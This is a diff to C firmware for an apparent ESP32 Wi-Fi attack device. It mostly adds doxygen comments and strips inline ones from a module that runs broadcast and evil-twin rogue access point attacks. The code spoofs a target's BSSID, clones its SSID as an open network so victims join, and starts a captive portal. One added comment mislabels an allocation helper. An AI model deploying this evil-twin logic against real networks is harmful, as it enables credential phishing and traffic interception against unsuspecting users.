@@ -59,6 +59,12 @@ typedef struct
     wifi_ap_record_t ap;
 } poom_wifi_attacks_task_param_t;
 
+/**
+ * @brief Internal helper for `poom_wifi_attacks_force_ap_config`.
+ *
+ * @param[in] ap Parameter passed to the function.
+ * @return void
+ */
 static void poom_wifi_attacks_force_ap_config_(const wifi_ap_record_t *ap)
 {
     wifi_config_t cfg = {0};
@@ -92,6 +98,12 @@ static void poom_wifi_attacks_force_ap_config_(const wifi_ap_record_t *ap)
     }
 }
 
+/**
+ * @brief Runs the internal task for this module.
+ *
+ * @param[in] ap Parameter passed to the function.
+ * @return poom_wifi_attacks_task_param_t *
+ */
 static poom_wifi_attacks_task_param_t *poom_wifi_attacks_alloc_task_param_(const wifi_ap_record_t *ap)
 {
     poom_wifi_attacks_task_param_t *param;
@@ -156,7 +168,6 @@ static void poom_wifi_attacks_broadcast_attack_task_(void *param)
 
     free(param);
 
-    /* Ensure Wi-Fi is initialized with an AP interface for raw TX (no cloned/open AP). */
     esp_err_t error = poom_wifi_ctrl_init_apsta();
     if(error != ESP_OK)
     {
@@ -232,7 +243,6 @@ static void poom_wifi_attacks_rogue_ap_attack_task_(void *param)
 
     free(param);
 
-    /* Best-effort: reset Wi-Fi stack to avoid mode/config conflicts. */
     error = poom_wifi_ctrl_deinit();
     if((error != ESP_OK) && (error != ESP_ERR_WIFI_NOT_INIT))
     {
@@ -240,21 +250,17 @@ static void poom_wifi_attacks_rogue_ap_attack_task_(void *param)
     }
 
 
-    /* Evil-twin lab: spoof SoftAP MAC to match the selected AP BSSID. */
     error = poom_wifi_ctrl_set_ap_mac(ap.bssid);
     if(error != ESP_OK)
     {
         POOM_PRINTF_W("poom_wifi_ctrl_set_ap_mac failed: %s", esp_err_to_name(error));
     }
 
-    /* Use selected SSID and force OPEN auth so victims can join. */
     poom_wifi_captive_set_ap_clone((const char *)ap.ssid, true);
     poom_wifi_captive_start();
 
-    /* Defensive: ensure SSID is not overwritten by other AP configs (e.g. Manager AP). */
     poom_wifi_attacks_force_ap_config_(&ap);
 
-    /* Match the target channel (captive module sets a default channel internally). */
     error = poom_wifi_ctrl_set_channel((uint8_t)ap.primary);
     if(error != ESP_OK)
     {
@@ -418,11 +424,9 @@ void poom_wifi_attacks_stop_all(void)
 {
     POOM_PRINTF_I("Deteniendo todos los ataques de Wi-Fi...");
 
-    /* Signal tasks to exit (they self-delete and clear their handles). */
     s_poom_wifi_attacks_broadcast_running = false;
     s_poom_wifi_attacks_rogue_ap_running = false;
 
-    /* Wait briefly for tasks to stop cleanly (avoid killing tasks mid Wi-Fi call). */
     const TickType_t deadline = xTaskGetTickCount() + pdMS_TO_TICKS(1500);
     while (((s_poom_wifi_attacks_task_broadcast != NULL) || (s_poom_wifi_attacks_task_rogue_ap != NULL)) &&
            (xTaskGetTickCount() < deadline))
@@ -430,11 +434,9 @@ void poom_wifi_attacks_stop_all(void)
         vTaskDelay(pdMS_TO_TICKS(50));
     }
 
-    /* Best-effort cleanup (idempotent). */
     poom_wifi_captive_stop();
     (void)esp_wifi_set_promiscuous(false);
 
-    /* Reset handles if tasks are still present (should be rare). */
     s_poom_wifi_attacks_task_broadcast = NULL;
     s_poom_wifi_attacks_task_rogue_ap = NULL;
 
